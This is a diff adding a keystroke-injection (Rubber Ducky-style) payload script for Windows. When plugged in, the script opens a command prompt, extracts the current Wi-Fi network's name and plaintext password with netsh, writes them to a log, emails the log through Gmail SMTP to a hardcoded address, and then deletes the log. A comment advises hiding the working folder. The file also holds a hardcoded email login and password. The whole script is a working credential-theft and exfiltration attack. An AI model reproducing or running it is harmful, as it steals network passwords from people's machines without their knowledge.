@@ -1,0 +1,99 @@
+DELAY 2000
+WINDOWS D
+DELAY 1000
+REM --> Open cmd
+WINDOWS R
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+REM --> Change directory (you can change this to something else to make less visible)
+STRING cd "%USERPROFILE%\OneDrive\Desktop"
+ENTER
+REM --> Get SSID
+STRING for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "B"') do set SSID=%A
+ENTER
+REM --> Get network type
+STRING netsh wlan show profiles %SSID% | findstr "Network type" | findstr /v "broadcast" | findstr /v "Radio">Temp.txt
+ENTER
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" Temp.txt') do set NETTYPE=%A
+ENTER
+REM --> Get authentication
+STRING netsh wlan show profiles %SSID% | findstr "Authentication">Temp.txt
+ENTER
+STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" Temp.txt') do set AUTH=%A
+ENTER
+REM --> Get key
+STRING netsh wlan show profiles %SSID% key=clear | findstr "Key Content">Temp.txt
+ENTER
+STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" Temp.txt') do set KEY=%A
+ENTER
+REM --> Delete Temp.txt
+STRING del Temp.txt
+ENTER
+REM --> Create Log.txt
+STRING echo SSID: %SSID%>>Log.txt & echo Network type: %NETTYPE%>>Log.txt & echo Authentication: %AUTH%>>Log.txt & echo Password: %KEY%>>Log.txt
+ENTER
+REM --> Mail Log.txt
+STRING powershell
+DELAY 150
+ENTER
+DELAY 150
+STRING $SMTPServer = 'smtp.gmail.com'
+DELAY 150
+ENTER
+DELAY 150
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+DELAY 150
+ENTER
+DELAY 150
+STRING $SMTPPort = "587"
+DELAY 150
+ENTER
+DELAY 150
+STRING $SMTPInfo.EnableSsl = $true
+DELAY 150
+ENTER
+DELAY 150
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ronniri2010@gmail.com', 'ronniri2010');
+DELAY 150
+ENTER
+DELAY 150
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+DELAY 150
+ENTER
+DELAY 150
+STRING $ReportEmail.From = 'ronniri2010@gmail.com'
+DELAY 150
+ENTER
+DELAY 150
+STRING $ReportEmail.To.Add('ronniri2010@gmail.com')
+DELAY 150
+ENTER
+DELAY 150
+STRING $ReportEmail.Subject = 'WiFi'
+DELAY 150
+ENTER
+DELAY 150
+STRING $ReportEmail.Body = 'The log is attached!' 
+DELAY 150
+ENTER
+DELAY 150
+STRING $ReportEmail.Attachments.Add('Log.txt')
+DELAY 150
+ENTER
+DELAY 150
+STRING $SMTPInfo.Send($ReportEmail)
+DELAY 150
+ENTER
+DELAY 150
+STRING exit
+DELAY 150
+ENTER
+DELAY 150
+REM --> Delete Log.txt and exit
+DELAY 150
+STRING del Log.txt & exit
+DELAY 150
+ENTER
+DELAY 150
